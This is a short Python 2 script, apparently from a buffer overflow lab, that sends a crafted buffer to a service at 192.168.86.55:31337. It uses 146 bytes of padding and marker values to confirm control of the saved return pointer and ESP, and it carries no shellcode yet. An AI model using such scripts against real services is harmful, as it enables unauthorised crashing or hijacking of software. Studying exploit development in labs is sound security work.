#!/usr/bin/env python2
import socket

# variables
buf_totlen = 1024
offset_srp = 146

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += "BBBB"							# SRP overwrite
buf += "CCCC"							# ESP should end up pointing here
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
